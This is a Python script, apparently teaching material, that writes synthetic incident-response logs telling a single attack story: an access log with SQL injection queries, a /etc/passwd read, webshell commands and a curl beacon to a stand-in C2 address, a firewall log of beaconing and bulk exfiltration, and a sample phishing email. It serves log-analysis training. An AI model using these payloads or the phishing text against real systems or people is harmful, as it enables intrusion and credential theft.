#!/usr/bin/env python3
"""Week12 — Incident Response Logs Generator (3 files, coherent attack narrative)"""
import os
from datetime import datetime, timedelta

BASE_DIR = "week12_incident_response/dataset"
os.makedirs(BASE_DIR, exist_ok=True)

# Attack narrative:
# 08:22 — Phishing email received
# 14:30 — Attacker connects (stole creds via phishing link)
# 14:32 — Reconnaissance on web server
# 14:45 — SQLi → webshell upload
# 15:00 — Webshell execution
# 15:05 — Outbound C2 beacon starts
# 15:20 — Data exfiltration

ATTACKER_EXT = "185.220.101.42"   # External attacker IP
C2_SERVER    = "198.51.100.77"    # C2 server IP
VICTIM_IP    = "10.0.0.20"       # Internal victim workstation

# ─── access.log ─────────────────────────────────────────────────────────────
def gen_access_log():
    lines = [
        # Recon
        f'10.0.0.20 - - [07/Jun/2026:14:32:11 +0800] "GET / HTTP/1.1" 200 4312 "-" "curl/7.81.0"',
        f'10.0.0.20 - - [07/Jun/2026:14:32:15 +0800] "GET /robots.txt HTTP/1.1" 200 82 "-" "curl/7.81.0"',
        f'10.0.0.20 - - [07/Jun/2026:14:32:18 +0800] "GET /store/product.php?id=1 HTTP/1.1" 200 2341 "-" "Mozilla/5.0"',
        # SQLi
        f'10.0.0.20 - - [07/Jun/2026:14:45:03 +0800] "GET /store/product.php?id=1\' HTTP/1.1" 500 312 "-" "Mozilla/5.0"',
        f'10.0.0.20 - - [07/Jun/2026:14:45:09 +0800] "GET /store/product.php?id=1+UNION+SELECT+1,2,3-- HTTP/1.1" 200 1892 "-" "Mozilla/5.0"',
        f'10.0.0.20 - - [07/Jun/2026:14:45:22 +0800] "GET /store/product.php?id=1+UNION+SELECT+1,@@version,3-- HTTP/1.1" 200 2104 "-" "Mozilla/5.0"',
        f'10.0.0.20 - - [07/Jun/2026:14:46:01 +0800] "GET /store/product.php?id=1+UNION+SELECT+1,load_file(0x2f6574632f706173737764),3-- HTTP/1.1" 200 3412 "-" "Mozilla/5.0"',
        # File upload (webshell)
        f'10.0.0.20 - - [07/Jun/2026:14:58:44 +0800] "POST /store/upload.php HTTP/1.1" 200 156 "http://10.0.0.100/store/profile.php" "Mozilla/5.0"',
        # Webshell execution
        f'10.0.0.20 - - [07/Jun/2026:15:00:12 +0800] "GET /store/uploads/shell.php?cmd=id HTTP/1.1" 200 48 "-" "python-requests/2.28.0"',
        f'10.0.0.20 - - [07/Jun/2026:15:00:19 +0800] "GET /store/uploads/shell.php?cmd=whoami HTTP/1.1" 200 44 "-" "python-requests/2.28.0"',
        f'10.0.0.20 - - [07/Jun/2026:15:00:31 +0800] "GET /store/uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2847 "-" "python-requests/2.28.0"',
        f'10.0.0.20 - - [07/Jun/2026:15:01:05 +0800] "GET /store/uploads/shell.php?cmd=curl+http://198.51.100.77/beacon HTTP/1.1" 200 32 "-" "python-requests/2.28.0"',
    ]
    with open(f"{BASE_DIR}/access.log", "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"access.log: {len(lines)} lines")

# ─── firewall.log ────────────────────────────────────────────────────────────
def gen_firewall_log():
    lines = [
        "2026-06-07 15:05:01 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [ESTABLISHED] bytes=128",
        "2026-06-07 15:05:31 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [ESTABLISHED] bytes=128",
        "2026-06-07 15:06:01 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [ESTABLISHED] bytes=128",
        "2026-06-07 15:06:31 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [ESTABLISHED] bytes=128",
        "2026-06-07 15:07:01 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [ESTABLISHED] bytes=128",
        "# Regular traffic (baseline)",
        "2026-06-07 14:00:01 ALLOW  OUT TCP 10.0.0.20:49801  -> 8.8.8.8:53         [DNS] bytes=72",
        "2026-06-07 14:00:02 ALLOW  IN  TCP 8.8.8.8:53       -> 10.0.0.20:49801    [DNS] bytes=88",
        "# Suspicious large outbound transfer",
        "2026-06-07 15:20:14 ALLOW  OUT TCP 10.0.0.100:54290 -> 198.51.100.77:443  [ESTABLISHED] bytes=4194304",
        "2026-06-07 15:20:51 ALLOW  OUT TCP 10.0.0.100:54291 -> 198.51.100.77:443  [ESTABLISHED] bytes=4194304",
        "2026-06-07 15:21:33 ALLOW  OUT TCP 10.0.0.100:54292 -> 198.51.100.77:443  [ESTABLISHED] bytes=2097152",
        "# Connection terminated after transfer",
        "2026-06-07 15:22:05 ALLOW  OUT TCP 10.0.0.100:54231 -> 198.51.100.77:443  [FIN] bytes=0",
    ]
    with open(f"{BASE_DIR}/firewall.log", "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"firewall.log: {len(lines)} lines")

# ─── mail.txt ────────────────────────────────────────────────────────────────
def gen_mail():
    content = """\
From: IT-Support <it-support@update-corp.net>
To: employee@company.local
Date: Mon, 07 Jun 2026 08:22:14 +0800
Subject: [URGENT] Password Expiry Notice — Action Required

Dear Employee,

Your corporate password will expire in 24 hours.

To prevent account lockout, please update your password immediately:
  http://corp-portal-update.xyz/reset?token=eyJhbGci...

Failure to update your password will result in account suspension.

Thank you,
IT Support Team
Company Corp.

--- 
Note: If you did not request this, please ignore this email.
DO NOT reply to this automated message.
"""
    with open(f"{BASE_DIR}/mail.txt", "w") as f:
        f.write(content)
    print("mail.txt: phishing email saved")

gen_access_log()
gen_firewall_log()
gen_mail()
